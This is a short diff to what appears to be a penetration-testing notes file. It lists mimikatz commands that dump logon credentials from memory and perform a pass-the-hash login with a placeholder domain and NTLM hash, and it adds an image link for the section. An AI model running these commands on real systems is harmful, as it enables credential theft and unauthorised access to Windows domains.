@@ -5,3 +5,5 @@ mimikatz# privilege::debug
 mimikatz# sekurlsa::logonpasswords
 
 mimikatz# sekurlsa::pth /user:admin /domain:xyz.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+![](images/Pass The Hash.png) <br />
